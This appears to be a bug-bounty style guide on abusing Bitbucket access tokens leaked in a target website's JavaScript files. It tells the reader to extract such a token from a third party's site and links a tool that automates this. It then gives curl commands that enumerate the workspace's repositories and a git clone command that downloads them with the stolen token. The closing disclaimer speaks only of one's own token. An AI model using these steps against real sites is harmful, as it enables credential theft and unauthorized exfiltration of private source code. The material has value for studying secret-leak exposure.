# Downloading All Repositories from a Bitbucket Workspace

This guide demonstrates how to download all repositories from a Bitbucket workspace using a `BITBUCKET_READ_TOKEN`. Follow the steps below for a complete walkthrough.

---

## Prerequisites
- A valid Bitbucket access token (`BITBUCKET_READ_TOKEN`).
- `curl` installed on your system.
- Git installed on your system.

---

## Steps to Download Repositories

### Step 1: Obtain the BITBUCKET_READ_TOKEN
To collect the BITBUCKET_READ_TOKEN, follow these steps:

Visit your target URL JS file and search for the `BITBUCKET_READ_TOKEN`.\
Example: `https://target-site.com/assets/js-fileName.js`\
Extract the BITBUCKET_READ_TOKEN from the JavaScript file.
![bitbucket-read-token](https://github.com/user-attachments/assets/1e0971ec-7277-4b3b-a8db-f9f2e399123c)

For automation, you can use the following tool to extract the token: [bitbucket-token](https://github.com/s41n1k/bitbucket-token)

---

### Step 2: Get Workspace Information
To list all available repositories in the workspace, run the following command:\
`curl https://api.bitbucket.org/2.0/repositories/workspaceNmae-Here?page=1 --header "Authorization: Bearer <BITBUCKET_READ_TOKEN>"`\
This will return information about all repositories in the workspace.

### Step 3: Get Repository Information
To retrieve information about a specific repository, use the following command:\
`curl https://api.bitbucket.org/2.0/repositories/workspaceNmae-Here/repository-Name-Here --header "Authorization: Bearer <BITBUCKET_READ_TOKEN>"`

### Step 4: Get Project Information
To search for a project, use the project key (e.g., EHP) in the query:\
`curl "https://api.bitbucket.org/2.0/repositories/workspaceNmae-Here?q=project.key%3D%22EHP%22" \
--header "Authorization: Bearer <BITBUCKET_READ_TOKEN>"`

### Step 5: Clone Each Repository
To clone a repository, use the following command:\
`git clone https://x-token-auth:<BITBUCKET_READ_TOKEN>@bitbucket.org/workspaceNmae-Here/repository-Name-Here.git`\
Replace `<BITBUCKET_READ_TOKEN>` with your full token.
![4  repository download](https://github.com/user-attachments/assets/07f773de-da2e-48be-b30e-b31c8720c0b3)

## References
For more information, refer to the Bitbucket [API Documentation](https://support.atlassian.com/bitbucket-cloud/docs/using-access-tokens/).

## ⚠️ Disclaimer
Use your access token responsibly and ensure it is kept secure.\
Do not share your token publicly.\
Misuse of the Bitbucket API may result in account suspension or other penalties.



**Thank you for Reading.**\
 **Happy Hunting!!**\
 **./s41n1k**


